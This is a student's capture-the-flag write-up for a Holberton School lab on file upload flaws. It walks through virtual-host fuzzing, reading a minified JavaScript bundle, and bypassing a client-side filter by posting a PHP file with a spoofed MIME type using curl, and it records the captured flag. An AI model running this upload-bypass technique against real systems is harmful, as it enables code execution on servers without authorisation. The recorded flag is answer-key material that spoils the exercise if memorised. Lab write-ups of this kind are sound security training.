# Upload Vulnerabilities



## 0. Oops! We forget that endpoint for testing purpose

Your mission is to determine which subdomain contains a web application with an insecure file upload feature.
This task requires you to methodically explore each subdomain, looking for any interfaces or functionalities that allow file uploads.
Identifying the correct subdomain sets the stage for deeper vulnerability analysis in subsequent tasks.

- Main Domain: http://web0x05.hbtn
- Example:
  ```
  $ cat 0-target.txt
  up3l0d3r.web0x05.hbtn
  ```

### Start sandbox

- start `cyber_websec_0x05` sandbox
- \Network information: ip: `10.42.220.203`
- put ip in `/etc/hosts` file: `
  ```bash
  sudo bash -c "echo '10.42.220.203  web0x05.hbtn' >> /etc/hosts"
  cat /etc/hosts
  ```
  - start vpn

```



### check what is running the main host

```bash
curl -sv http://web0x05.hbtn
* Host web0x05.hbtn:80 was resolved.
* IPv6: (none)
* IPv4: 10.42.220.203
*   Trying 10.42.220.203:80...
* Established connection to web0x05.hbtn (10.42.220.203 port 80) from 10.8.0.2 port 46088 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: web0x05.hbtn
> User-Agent: curl/8.19.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.22.1
< Date: Sun, 26 Jul 2026 14:32:29 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 281
< Connection: keep-alive
< 
<html>
        <head>
                <title>Holberton School - 404 Error - Subdomain</title>
                <link rel="icon" href="/static/favicon.ico">
                <script>location.pathname != "/" ? location.replace("/", "") : null;</script>
        </head>
        <body>
                <span>Invalid Subdomain, try harder...</span>
        </body>
* Connection #0 to host web0x05.hbtn:80 left intact
</html>
```
**What we learned:**

- The IP behind the name is `10.42.220.203`, served by **nginx/1.22.1**.
- We got `HTTP/1.1 200 OK` , but 
  - the title says `404 Error - Subdomain` 
  - the body says `Invalid Subdomain, try harder...`

**nginx** here is configured with **name-based virtual hosts**: it decides what to serve based on the `Host:` header sent. When the `Host` doesn't match any real app (as with the bare `web0x05.hbtn`), it falls through to a `catch-all vhost` that returns this *"Invalid Subdomain"* page. Notice `Content-Length: 281` -- that's the fingerprint of a miss.

The subdomains aren't in DNS; they exist only as `Host:` values nginx recognizes. We'll **fuzz the `Host` header** with a wordlist and filter out anything that looks like this 281-byte "Invalid Subdomain" page. Whatever comes back *different* is a real subdomain.


### double-check baseline

Before we unleash a wordlist, let's nail down the negative baseline precisely -- i.e., confirm that a made-up subdomain also returns that same "miss" page, so we know exactly what size to filter later.

```bash
curl -s -o /dev/null -w "Status: %{http_code}  Size: %{size_download}\n" -H "Host: definitelynotreal.web0x05.hbtn" http://web0x05.hbtn
# Status: 200  Size: 281
```
- `-s` – silent, no progress meter.
- `-o /dev/null` – throw away the HTML body; we don't need to see it again.
- `-w "..."` – write-out a custom summary after the request. `%{http_code}` prints the status code and `%{size_download}` prints the response body size in bytes.
- `-H "Host: definitelynotreal.web0x05.hbtn"` – this is the important bit: we override the Host header with a subdomain we're confident doesn't exist. `curl` still connects to the same IP (resolved from `web0x05.hbtn`), but nginx sees this fake `Host`.


### fuzz vhost subdomain

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://web0x05.hbtn/ \
     -H "Host: FUZZ.web0x05.hbtn" \
     -fs 281

#        /'___\  /'___\           /'___\       
#       /\ \__/ /\ \__/  __  __  /\ \__/       
#       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
#        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
#         \ \_\   \ \_\  \ \____/  \ \_\       
#          \/_/    \/_/   \/___/    \/_/       
#
#       v2.1.0-dev
#________________________________________________
#
# :: Method           : GET
# :: URL              : http://web0x05.hbtn/
# :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
# :: Header           : Host: FUZZ.web0x05.hbtn
# :: Follow redirects : false
# :: Calibration      : false
# :: Timeout          : 10
# :: Threads          : 40
# :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
# :: Filter           : Response size: 281
#________________________________________________
#
#:: Progress: [4989/4989] :: Job [1/1] :: 306 req/sec :: Duration: [0:00:18] :: Errors: 0 ::




# gobuster alternative

gobuster vhost -u http://web0x05.hbtn -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
# ===============================================================
# Gobuster v3.8.2
# by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
# ===============================================================
# [+] Url:                       http://web0x05.hbtn
# [+] Method:                    GET
# [+] Threads:                   10
# [+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
# [+] User Agent:                gobuster/3.8.2
# [+] Timeout:                   10s
# [+] Append Domain:             true
# [+] Exclude Hostname Length:   false
# ===============================================================
# Starting gobuster in VHOST enumeration mode
# ===============================================================
# Progress: 4989 / 4989 (100.00%)
# ===============================================================
# Finished
# ===============================================================
```

- no result with `ffuf` or `gobuster`


### Examine deeper the hint `up3l0d3r.web0x05.hbtn`

Let's stop and reread the clue the challenge handed us: `up3l0d3r.web0x05.hbtn`

That's **leetspeak** – "uploader" with `o→0`, `e→3` `a→4`... actually `up3l0d3r` ≈ "upel0der". The point is the subdomains here don't follow standard naming; they're stylized/themed words. A generic DNS subdomain list will never contain them, which is exactly why we came up empty. That reframes our strategy: we either need a themed/leetspeak wordlist, or we start by testing the obvious hint the author practically gift-wrapped for us.

Before we go build or hunt for a bigger wordlist, let's spend one cheap request testing that literal example – it's the single most likely candidate and it costs nothing to check.

```bash
curl -s -o /dev/null -w "Status: %{http_code}  Size: %{size_download}\n" -H "Host: up3l0d3r.web0x05.hbtn" http://web0x05.hbtn
# Status: 200  Size: 281

curl -s -o /dev/null -w "Status: %{http_code}  Size: %{size_download}\n" -H "Host: upl04d3r.web0x05.hbtn" http://web0x05.hbtn
# Status: 200  Size: 281
```

- no new insights :-(

### bigger wordlist

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -u http://web0x05.hbtn/ \
     -H "Host: FUZZ.web0x05.hbtn" \
     -fs 281

#         /'___\  /'___\           /'___\       
#        /\ \__/ /\ \__/  __  __  /\ \__/       
#        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
#         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
#          \ \_\   \ \_\  \ \____/  \ \_\       
#           \/_/    \/_/   \/___/    \/_/       
# 
#        v2.1.0-dev
# ________________________________________________
# 
#  :: Method           : GET
#  :: URL              : http://web0x05.hbtn/
#  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
#  :: Header           : Host: FUZZ.web0x05.hbtn
#  :: Follow redirects : false
#  :: Calibration      : false
#  :: Timeout          : 10
#  :: Threads          : 40
#  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
#  :: Filter           : Response size: 281
# ________________________________________________
# 
# :: Progress: [19966/19966] :: Job [1/1] :: 248 req/sec :: Duration: [0:01:21] :: Errors: 0 ::


ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -u http://web0x05.hbtn/ \
     -H "Host: FUZZ.web0x05.hbtn" \
     -fs 281

#         /'___\  /'___\           /'___\       
#        /\ \__/ /\ \__/  __  __  /\ \__/       
#        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
#         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
#          \ \_\   \ \_\  \ \____/  \ \_\       
#           \/_/    \/_/   \/___/    \/_/       
# 
#        v2.1.0-dev
# ________________________________________________
# 
#  :: Method           : GET
#  :: URL              : http://web0x05.hbtn/
#  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
#  :: Header           : Host: FUZZ.web0x05.hbtn
#  :: Follow redirects : false
#  :: Calibration      : false
#  :: Timeout          : 10
#  :: Threads          : 40
#  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
#  :: Filter           : Response size: 281
# ________________________________________________
# 
# xn--cckcdp5nyc8g2837ahhi954c-jp [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 267ms]
# xn--7ck2d4a8083aybt3yv-com [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 273ms]
# xn--u9jxfma8gra4a5989bhzh976brkn72bo46f-com [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 112ms]
# 
# ... ~150 lines of status 500
# 
# xn--ecki1b5br0ae8iyd3due-jpnet [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 259ms]
# xn--qckyd1cv50v-jp      [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 167ms]
# xn--n8jl84alc9fsf5446c-com [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 344ms]
# :: Progress: [114442/114442] :: Job [1/1] :: 219 req/sec :: Duration: [0:08:44] :: Errors: 0 ::
```

- Everything that surfaced is an `xn--...` **punycode** entry returning `500` / **265 bytes**. These aren't real subdomains – they're internationalized-domain-name (IDN) strings in the wordlist. `nginx` (or an upstream) chokes on those unusual byte sequences in the `Host` header and throws a 500 server error (so thease are **false positives**)


### generating leet permutations

Rather than guess spellings one at a time, let's generate every plausible leet permutation programmatically and fuzz them all at once. First, let's build the wordlist.

```bash
{ for w in upload uploader uploads upl0ad upl0ad3r file files fileupload dropzone drop share sharex filedrop img image images media store storage holberton; do
    echo "$w"
    echo "$w" | sed 'y/oaeisltb/041i5l7b/'
    echo "$w" | sed 'y/aeiost/431057/'
    echo "$w" | sed 'y/aeiost/@31057/'
    echo "$w" | sed 'y/aeiost/43!057/'
    echo "$w" | sed 'y/aeiost/@3!057/'
    echo "$w" | sed 'y/aeiost/4310$7/'
    echo "$w" | sed 'y/aeiost/@310$7/'
    echo "$w" | sed 'y/aeiost/43!0$7/'
    echo "$w" | sed 'y/aeiost/@3!0$7/'
    echo "$w" | sed 'y/oae/04e/'
    echo "$w" | sed 'y/oaeis/o4315/'
  done; } | sort -u > leet-upload.txt; wc -l leet-upload.txt; cat leet-upload.txt

# 111 leet-upload.txt

ffuf -w leet-upload.txt \
     -u http://web0x05.hbtn/ \
     -H "Host: FUZZ.web0x05.hbtn" \
     -fs 281
#         /'___\  /'___\           /'___\       
#        /\ \__/ /\ \__/  __  __  /\ \__/       
#        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
#         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
#          \ \_\   \ \_\  \ \____/  \ \_\       
#           \/_/    \/_/   \/___/    \/_/       
# 
#        v2.1.0-dev
# ________________________________________________
# 
#  :: Method           : GET
#  :: URL              : http://web0x05.hbtn/
#  :: Wordlist         : FUZZ: /home/kali/dlh-cyber_security/web_application_security/0x05_upload_vulnerabilities/leet-upload.txt
#  :: Header           : Host: FUZZ.web0x05.hbtn
#  :: Follow redirects : false
#  :: Calibration      : false
#  :: Timeout          : 10
#  :: Threads          : 40
#  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
#  :: Filter           : Response size: 281
# ________________________________________________
# 
# :: Progress: [111/111] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
- built a custom "leet" wordlist in `leet-upload.txt` of 111 words
- unfortunately still no hits :-(


### Fuzzing URL Path instead of Host header

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
     -u http://web0x05.hbtn/FUZZ \
     -fs 281 -mc all -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://web0x05.hbtn/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
 :: Filter           : Response size: 281
________________________________________________

:: Progress: [63088/63088] :: Job [1/1] :: 284 req/sec :: Duration: [0:04:30] :: Errors: 0 ::
```

- Instead of fuzzing the **Host header** (vhosts), this fuzzes the **URL path** on the main domain. The idea: the "Invalid Subdomain" page might be a catch-all for *unknown hosts*, but the main host itself may still serve real paths (like `/upload`, `/robots.txt`, `/static/`) that reveal how the app is structured or reference the real subdomain names.
- `-u http://web0x05.hbtn/FUZZ` – FUZZ is now in the path, not the Host.
- `-w raft-medium-words.txt` – a standard content-discovery wordlist (common directory/file names).
- `-fs 281` – still filter the 281-byte miss page.
- `-mc all` – match all status codes (so we see 200/301/403/500, not just the defaults), then...
- `-fc 404` – ...filter out genuine 404s to cut noise.

We were checking whether the main domain exposes any **real paths** – an upload endpoint, a `robots.txt`, a sitemap, static assets, or an index that names other subdomains. Any of these could hand us the real subdomain directly instead of guessing -- but nope, no clues here either :-(



# check for purpose-built wordlists

```bash
ls -la /usr/share/seclists/Discovery/DNS/ | grep -iE 'leet|hacker|hostname|namelist|deepmagic|combined'
-rw-r--r-- 1 root root  8285473 Sep 19  2025 combined_subdomains.txt
-rw-r--r-- 1 root root   605423 Sep 19  2025 deepmagic.com-prefixes-top50000.txt
-rw-r--r-- 1 root root     3384 Sep 19  2025 deepmagic.com-prefixes-top500.txt
-rw-r--r-- 1 root root  1585853 Sep 19  2025 namelist.txt
-rw-r--r-- 1 root root   924904 Sep 19  2025 sortedcombined-knock-dnsrecon-fierce-reconng.txt
```

- These lists are ok, but too small.
- let's go for something big.


# check bigger wordlists

```bash
ls -lhS /usr/share/seclists/Discovery/DNS/ | head 
## -rw-r--r-- 1 root root  74M Sep 19  2025 FUZZSUBS_CYFARE_1.txt
## -rw-r--r-- 1 root root  74M Sep 19  2025 FUZZSUBS_CYFARE_2.txt
## -rw-r--r-- 1 root root  50M Sep 19  2025 n0kovo_subdomains.txt
## -rw-r--r-- 1 root root  26M Sep 19  2025 dns-Jhaddix.txt
## -rw-r--r-- 1 root root  25M Sep 19  2025 bug-bounty-program-subdomains-trickest-inventory.txt
## -rw-r--r-- 1 root root 8.0M Sep 19  2025 combined_subdomains.txt
## -rw-r--r-- 1 root root 5.8M Sep 19  2025 shubs-subdomains.txt
## -rw-r--r-- 1 root root 1.6M Sep 19  2025 namelist.txt
## -rw-r--r-- 1 root root 1.4M Sep 19  2025 bitquark-subdomains-top100000.txt
```

# fuzzing with `dns-Jhaddix.txt` (26 MB)

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt \        
     -u http://web0x05.hbtn/ \
     -H "Host: FUZZ.web0x05.hbtn" \
     -fs 281 -t 80 -o dns-Jhaddix.json
# test-s3
```


### check result 

```bash

curl -s http://web0x05.hbtn -H "Host: test-s3.web0x05.hbtn"            
# <!-- 
#         Done by 
#         -       Yosri.me (YosriGFX)
#         -       Ismail Mejdoub (Mejdoubee)
#         For Holberton School
# -->
# <!doctype html>
# <html lang="en">
#   <head>
#     <meta charset="UTF-8" />
#         <link rel="icon" href="/static/favicon.ico">
#     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
#     <title>File Manager - </title>
#     <script type="module" crossorigin src="/static/index-DYK-Cu5G.js"></script>
#   </head>
#   <body>
#     <div id="main" data-url=""></div>
#   </body>
# </html>
```

### save result

```bash
echo test-s3.web0x05.hbtn > 0-target.txt
cat 0-target.txt

git add .
git commit -m "0-target.txt"
git push
```



## 1. Some filters are only client-sided !

Having identified the vulnerable subdomain, your next challenge is to bypass the client-side file type filtering mechanism of the web application's upload feature.
Your success in uploading a restricted file type will reveal a hidden Flag ⛳️ as proof of your accomplishment.

- Target Endpoint: http://[vuln-subdomain].web0x05.hbtn/task1

You will need to use this php command to read the flag: <?php readfile('FLAG_1.txt') ?>
FLAG will only be generated if you upload a php file!

**Useful Instructions**

1. Use browser developer tools to inspect the upload form and any JavaScript code that validates file types. Look for patterns or keywords it checks against.
2. Consider using tools like Burp Suite to intercept and modify the upload request, changing the file name or MIME type to bypass client-side checks.
3. Explore different ways to initiate the file upload (e.g., drag-and-drop functionality) that might not trigger client-side validation as expected.
4. Pay attention to any error messages or feedback from the server after attempting an upload. These messages can offer clues for refining your bypass technique.


### examine `/task1` page

```bash
curl -v http://test-s3.web0x05.hbtn/task1                 
# * Could not resolve host: test-s3.web0x05.hbtn
# * Store negative name resolve for test-s3.web0x05.hbtn:80
# * shutting down connection #0
# curl: (6) Could not resolve host: test-s3.web0x05.hbtn
```

`test-s3.web0x05.hbtn` doesn't resolve because it's a virtual host, not a real DNS name.  \
Only `web0x05.hbtn` is in our `/etc/hosts`  \
Earlier we never resolved the subdomain – we always sent it as a `Host:` header while connecting to the base name. So we have two clean options:

1. **Option A** keep the `Host:` header and connect to the base host

```bash
curl -s -H "Host: test-s3.web0x05.hbtn" http://web0x05.hbtn/task1 | tee task1.html
# <!-- 
#       Done by 
#       -       Yosri.me (YosriGFX)
#       -       Ismail Mejdoub (Mejdoubee)
#       For Holberton School
# -->
# <!doctype html>
# <html lang="en">
#   <head>
#     <meta charset="UTF-8" />
#         <link rel="icon" href="/static/favicon.ico">
#     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
#     <title>File Manager - task1</title>
#     <script type="module" crossorigin src="/static/index-DYK-Cu5G.js"></script>
#   </head>
#   <body>
#     <div id="main" data-url="/api/task1/"></div>
#   </body>
# </html>
``` 

2. **Option B – add the vhost to `/etc/hosts` (most convenient)**. This makes the subdomain resolve to the same IP, so every normal command (`curl http://test-s3.web0x05.hbtn/...`, and even a browser) just works without header gymnastics.

```bash
# add vhost
echo "10.42.220.203 test-s3.web0x05.hbtn" | sudo tee -a /etc/hosts
# check /etc/hosts
cat /etc/hosts

# re-run the fetch
curl -s http://test-s3.web0x05.hbtn/task1 | tee task1.html; echo; wc -c task1.html
# <!-- 
#         Done by 
#         -       Yosri.me (YosriGFX)
#         -       Ismail Mejdoub (Mejdoubee)
#         For Holberton School
# -->
# <!doctype html>
# <html lang="en">
#   <head>
#     <meta charset="UTF-8" />
#         <link rel="icon" href="/static/favicon.ico">
#     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
#     <title>File Manager - task1</title>
#     <script type="module" crossorigin src="/static/index-DYK-Cu5G.js"></script>
#   </head>
#   <body>
#     <div id="main" data-url="/api/task1/"></div>
#   </body>
# </html>
# 494 task1.html
```

Better to go with option B because Burp/browser inspection is simpler.

The vhost resolves now, and this page hands us the key detail: **it's a JavaScript single-page app**.  \
The HTML is just a shell – the real logic lives in the JS bundle, and crucially, the mount point tells us the API base:

```html
<div id="main" data-url="/api/task1/"></div>
```

So the front-end (the `index-DYK-Cu5G.js` bundle) does its file-type validation in the browser, then POSTs to an API under `/api/task1/`. That `data-url` is the thread to pull: the client-side filter is exactly what we're meant to bypass, and the way to bypass a client-side check is to skip the client entirely and hit the API directly with curl. But first we need to know the exact request shape the API expects – the precise endpoint path, the file field name, and any other form fields.

Let's read the JS bundle first – it will show us the field names and the exact upload URL without guesswork.

```bash
curl -s http://test-s3.web0x05.hbtn/static/index-DYK-Cu5G.js | tee bundle.js | wc -c
# 451923
```

Let's check if minified.

```bash
head -c 500 bundle.js; echo; echo "--- line count ---"; wc -l bundle.js
# function __vite__mapDeps(indexes) {
#  if (!__vite__mapDeps.viteFileDeps) {
#     __vite__mapDeps.viteFileDeps = ["static/routes/file-manager-B-dpKQ9v.js","static/routes/snackbar-provider-BKjL41nT.js","static/routes/ButtonBase-BYeNwEdz.js","static/routes/useEnhancedEffect-CRBrkxaE.js","static/routes/403-B2xe_i3I.js","static/routes/motion-container-DHsPk0bY.js","static/routes/bounce-i2n4nULb.js","static/routes/Button-CG_aPiPw.js","static/routes/404-DPw30Jnz.js","static/routes/index-B12osy1N.js","sta
# --- line count ---
# 71 bundle.js
```

~ 6kB / line => minified.

- **71 lines for 441 KB** = ~6 KB per line on average. Human-written code is more like 30–80 chars per line. That density is the signature of minification: everything crammed onto few lines.
- The first bytes show `__vite__mapDeps` – so this is a **Vite** production build, exactly the tool we suspected from the hashed filename.
Notice the string array it's printing: `static/routes/file-manager-...js`, `403-...js`, `404-...js`, `Button-...js`. Vite does **code-splitting** – it lazy-loads route chunks. So the *upload logic for task1 probably isn't in this main bundle at all*; it's in one of these separate route chunks that loads on demand. The main bundle is mostly the router and framework glue.

This changes our search slightly: rather than grep the main bundle for upload logic that may live elsewhere, let's first pull out the **full list of route chunks** so we can spot the one that handles uploads (likely something with "upload", "task", or "file-manager" in the name).

```bash
grep -oE '"static/routes/[^"]+\.js"' bundle.js | tr -d '"' | sort -u
# static/routes/403-B2xe_i3I.js
# static/routes/404-DPw30Jnz.js
# static/routes/bounce-i2n4nULb.js
# static/routes/ButtonBase-BYeNwEdz.js
# static/routes/Button-CG_aPiPw.js
# static/routes/classic-J3PRySif.js
# static/routes/Container-Dmjin0dr.js
# static/routes/file-manager-B-dpKQ9v.js
# static/routes/header-simple-Cqv09_xg.js
# static/routes/index-B12osy1N.js
# static/routes/index-BPBoasAD.js
# static/routes/modern-compact-BAiPVhy_.js
# static/routes/motion-container-DHsPk0bY.js
# static/routes/snackbar-provider-BKjL41nT.js
# static/routes/Stack-aV8DaWSP.js
# static/routes/Toolbar-DizB3ty0.js
# static/routes/useEnhancedEffect-CRBrkxaE.js
# static/routes/use-responsive-BjpGEwk-.js
```

The standout candidate is **`file-manager-B-dpKQ9v.js`** – that's the app's core feature ("File Manager" was the page title all along), and the upload form plus its client-side filter almost certainly live there. The others are framework/UI plumbing (`Button`, `Stack`, `Toolbar`, `Container`), page shells (`403`, `404`), or theme variants (`classic`, `modern-compact`).

Let's pull that chunk and immediately search for the interesting strings.

```bash
curl -s http://test-s3.web0x05.hbtn/static/routes/file-manager-B-dpKQ9v.js -o file-manager.js
grep -oiE '\.(php|jpg|jpeg|png|gif|pdf|txt|svg|zip|exe)\b' file-manager.js | sort | uniq -c
echo "--- api / upload strings ---"
grep -oiE '(/api/[a-z0-9/_-]*|upload|accept|multipart|formdata|allowed|mime|extension)' file-manager.js | sort | uniq -c
# --- api / upload strings ---
#       1 /api/list/
#       1 FormData
#       5 upload
#       1 Upload
```

- download JS chunck locally as `file-manager.js`
- First grep – `\.(php|jpg|...)\b` scans for **file-extension literals**. The client-side filter has to name the extensions it allows or blocks somewhere, and minification leaves string literals untouched. `uniq -c` counts each so we see which extensions the code mentions. If we see `jpg/png/gif` but the task wants us to upload `.php`, that's the exact filter we're bypassing.
- Second grep – hunts for the A**PI and upload mechanics**: any `/api/...` path (our POST target, building on the `/api/task1/` we saw in `data-url`), plus telltale words like `upload`, `accept`, `multipart`, `formdata`, `allowed`, `mime`, `extension`. These reveal the endpoint, the request encoding, and the field names.

**Result**:

1. **No extension literals in this chunk**. That's actually a meaningful clue. It suggests the allowed-types filter might not be a hardcoded list like `['jpg','png']` in the code – it could instead be driven by an `accept` attribute on the file input, or a MIME check, or configuration fetched from the API. Or the upload logic lives partly in a *different* chunk. Either way, our simple grep was too narrow.
2. **`/api/list/` and `FormData` confirm the shape**. The app uses `FormData` (multipart) and has at least a listing endpoint. The upload endpoint itself didn't print as a clean `/api/...` string – which often means it's **built dynamically** by concatenating the base URL (remember `data-url="/api/task1/"`) with a suffix, so it doesn't exist as one literal string for grep to find.

Let's look at the actual **context around the `upload` occurrences** – that's where the endpoint, the field name, and any filtering will be visible together.

```bash
grep -oiE '.{80}upload.{90}' file-manager.js                                               
# hen((e=>e.$))),__vite__mapDeps([0,1,2,3,4,5,6,7,8])))),l={list_dir:"/api/list/",upload:document.getElementById("main").getAttribute("data-url")};function o(){const{enqueueSnack
# {children:t.jsx("title",{children:" Dashboard: File Manager"})}),t.jsx(n,{handleUpload:(e,t,a)=>{if(l.upload){const r=new FormData;r.append("file",e),fetch(l.upload,{method:"PO
# e.json())).then((e=>{e.error?t(e.error):(s(e.message),d(),a())}))}else t("Can't upload. Currently we don't support uploads.")},allFiles:o,setAllFiles:i,allTypes:["image"]})]})}
```

- `.{80}upload.{80}` – matches the word `upload` **plus 80/90 characters on each side**.  \
That surrounding context typically contains the endpoint path being built, the `FormData.append("fieldname", file)` call (revealing the *file field name*), and any adjacent validation.
- **Endpoint**: `upload:document.getElementById("main").getAttribute("data-url")` – so the upload URL is the `data-url` we already saw: **`/api/task1/`**. The POST goes straight there.
- **Field name**: `r.append("file",e)` — the file is sent under the field name **`file`**. curl must match this exactly.
- **Request**: `r=new FormData` `+` `fetch(l.upload, {...})` → a standard multipart/form-data **POST**
- **The filter**: the very end shows `allTypes:["image"]`, i.e. a client-side allowed-types list restricted to images. That's the check we bypass.  \
Note: this validation exists only in the browser JS. The server-side handler at `/api/task1/` is what we're POSTing to directly — skipping the JS means skipping the filter entirely.

We have everything needed. Let's build the PHP payload and upload it in one go.

```bash
# create php file
printf "%s" "<?php readfile('FLAG_1.txt') ?>" > shell.php

# check php file
cat shell.php
# <?php readfile('FLAG_1.txt') ?>

# upload
curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task1/ -F "file=@shell.php;type=image/png"
# HTTP/1.1 200 OK
# Server: nginx/1.22.1
# Date: Sun, 26 Jul 2026 21:22:58 GMT
# Content-Type: application/json
# Content-Length: 64
# Connection: keep-alive
# 
# {"message":"'/static/upload/shell.php' uploaded successfully."}
```

- `shell.php` payload uploaded at **`/static/upload/shell.php`**


### activate php payload

```bash
curl -s http://test-s3.web0x05.hbtn/static/upload/shell.php
# 91bfa5e55b2c6d354bc91479e62207bf
```

### save flag

```bash
echo 91bfa5e55b2c6d354bc91479e62207bf > 1-flag.txt
cat 1-flag.txt

git add .
git commit -m "1-flag.txt"
git push
```